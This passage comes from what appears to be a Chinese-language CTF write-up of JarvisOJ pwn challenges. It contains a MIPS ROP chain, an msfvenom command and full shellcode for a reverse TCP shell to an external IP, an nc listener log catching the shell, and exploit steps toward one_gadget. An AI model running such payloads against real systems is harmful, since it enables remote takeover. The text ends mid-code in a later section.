       0x40f978    lw     $a2, 8($sp)
       0x40f97c    addiu  $v0, $zero, 0xfa3
       0x40f980    syscall 
       0x40f984    sw     $v0, 0x24($sp)
       0x40f988    sw     $a3, 0x28($sp)
       0x40f98c    lw     $a0, 0x2c($sp)
       0x40f990    lw     $t9, -0x7ccc($gp)
       0x40f994    nop    
       0x40f998    jalr   $t9
这样就看的很清楚了，可以控制 read 的三个参数和后边的任意跳转（佩服大佬找 gadget 的深厚功力，如果师傅们有什么好的找 gadget
的方法，请务必指教）
可以构造如下的 rop chain
    +----------+
    |0x0040F968|   read(4, 0x10000000, 0x400)
    +----------+                                |
    |0x400     |   gp = sp + 0x20 = 0x10007ccc
  3. lw $a0, ($sp) -> a0 = sp = 4
  4. lw $a1, 4($sp) -> a1 = sp + 4 = 0x10000000
  5. lw $a2, 8($sp) -> a2 = sp + 8 = 0x400
  6. syscall -> read(4, 0x10000000, 0x400)
  7. lw $t9, -0x7ccc($gp) -> t9 = 0x100000000
  8. jalr $t9 -> 跳转到 0x10000000
因此，我们只需要把一段 reverse shell 的 shellcode 读到 0x10000000 即可，我用 msf 生成了一段
    root@58a35925ee88:/# msfvenom -a mipsle -p linux/mipsle/shell_reverse_tcp LHOST=123.207.141.87 LPORT=4445 -f python
    [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
    No encoder or badchars specified, outputting raw payload
    Payload size: 184 bytes
    Final size of python file: 896 bytes
    buf =  ""
    buf += "\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd"
    buf += "\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01"
    buf += "\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f"
    buf += "\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x11\x5d\x0e\x3c"
    buf += "\x11\x5d\xce\x35\xe4\xff\xae\xaf\x8d\x57\x0e\x3c\x7b"
    buf += "\xcf\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff"
    buf += "\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01"
    buf += "\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f"
    buf += "\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff"
    buf += "\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff"
    buf += "\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf"
    buf += "\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf"
    buf += "\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc"
    buf += "\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01"
    buf += "\x01\x01"
    # 腾讯云的学生主机没什么东西，大佬们就不要搞了
然后就可以在 vps 上拿到 shell 了
    ubuntu@VM-61-71-ubuntu:~$ nc -lvp 4445
    Listening on [0.0.0.0] (family 0, port 4445)
    Connection from [209.222.100.138] port 4445 [tcp/*] accepted (family 2, sport 39056)
    ls
    flag
    pwn100
    supervisord.log
    supervisord.pid
    id
    uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_png2ascii/solve.py)
## [61dctf]inst (500)
这是 Google CTF2017 的一道原题。
看一下程序的主要逻辑
    void do_test()
    {
      char *v0; // rbx
      char v1; // al
      unsigned __int64 v2; // r12
      unsigned __int64 buf; // [rsp+8h] [rbp-18h]
      v0 = (char *)alloc_page();
      *(_QWORD *)v0 = *(_QWORD *)template;
      *((_DWORD *)v0 + 2) = *((_DWORD *)template + 2);
      v1 = *((_BYTE *)template + 14);
      *((_WORD *)v0 + 6) = *((_WORD *)template + 6);
      v0[14] = v1;
      read_inst(v0 + 5);
      make_page_executable(v0);
      v2 = __rdtsc();
      ((void (__fastcall *)(char *))v0)(v0);
      buf = __rdtsc() - v2;
      if ( write(1, &buf, 8uLL) != 8 )
        exit(0);
      free_page(v0);
    }
每次会申请一段空间，设置可执行权限，然后读 4 个字节到 template 中，最后执行 template，看一下 template
    .rodata:0000000000000C00                 public template
    .rodata:0000000000000C00 template        proc near               ; DATA XREF: do_test+15↑o
    .rodata:0000000000000C00                 mov     ecx, 1000h
    .rodata:0000000000000C05
    .rodata:0000000000000C05 loc_C05:                                ; CODE XREF: template+C↓j
    .rodata:0000000000000C05                 nop
    .rodata:0000000000000C06                 nop
    .rodata:0000000000000C07                 nop
    .rodata:0000000000000C08                 nop
    .rodata:0000000000000C09                 sub     ecx, 1
    .rodata:0000000000000C0C                 jnz     short loc_C05
    .rodata:0000000000000C0E                 retn
    .rodata:0000000000000C0E template        endp
根据这段汇编的逻辑，我们每次的输入会被程序反复执行 1000 次，但可以用 ret 跳出这段循环。
如果能设置 rsp，使用 ret 就能控制程序的运行流程了。比如把 rsp 改成 rop chain 的开头或者 one_gadget。
调试可以发现在 do_test() 运行的过程中，r14， r15 两个寄存器是不变的，因此可以考虑用这两个寄存器保存一些值。以设置 rsp 为
one_gadget 为例，首先我们需要一个 libc 上的地址，并且距离 one_gadget 比较近，调试可以发现在 templete 开头时，rsp
+ 0x40 这个地方存储了 __libc_start_main + 231，这个地址距离 one_gadget 较近，先把这个地址保存到 r14 上
    pwndbg> stack 10
    00:0000│ rsp  0x7ffeb2d93408 —▸ 0x5641ea376b18 ◂— rdtsc
    01:0008│      0x7ffeb2d93410 —▸ 0x7fcc316520e0 (_dl_fini) ◂— push   rbp
    02:0010│      0x7ffeb2d93418 ◂— 0x0
    ... ↓
    04:0020│      0x7ffeb2d93428 —▸ 0x5641ea3768c9 ◂— xor    ebp, ebp
    05:0028│ rbp  0x7ffeb2d93430 —▸ 0x7ffeb2d93440 —▸ 0x5641ea376b60 ◂— push   r15
    06:0030│      0x7ffeb2d93438 —▸ 0x5641ea3768c7 ◂— jmp    0x5641ea3768c0
    07:0038│      0x7ffeb2d93440 —▸ 0x5641ea376b60 ◂— push   r15
    08:0040│      0x7ffeb2d93448 —▸ 0x7fcc312aaa87 (__libc_start_main+231) ◂— mov    edi, eax
    09:0048│      0x7ffeb2d93450 ◂— 0x0
通过 0x40 次循环可以把这个地址保存在 r14 上
    >>> len(asm('mov r14, rsp;ret'))
    4
    >>> len(asm('inc r14'))
    3
    >>> len(asm('mov r14, [r14]; ret'))
    4
然后再根据 libc 中的偏移是固定的，更改 r14 为 one_gadget 地址
        execsc(asm("add r14, {}".format(offset / 0x1000)))
        loop = offset - offset / 0x1000 * 0x1000
        print "loop for {:#x} times...".format(loop)
        pause()
        for i in xrange(loop):
            execsc(add_r14)
最后修改 rsp 即可
    >>> len(asm('mov [rsp], r14'))
    4
[_exploit
here_](https://github.com/bash-c/pwn_repo/blob/master/jarvisOJ_inst/exp.py)
## [61dctf]xworks (500)
静态编译的程序，并且是 strip 后的，先用 rizzo 和 sig 恢复一下符号。
程序的逻辑很简单，漏洞也很明显，在 delete， show 和 edit 功能中均存在 uaf
    void show_order()
    {
      signed int idx; // [rsp+Ch] [rbp-4h]
      _libc_write(1LL, "Input the order index:", 22LL);
      idx = get_int();
      if ( idx >= 0 && idx = 0 && idx = 0 && idx 
Linux Manual Page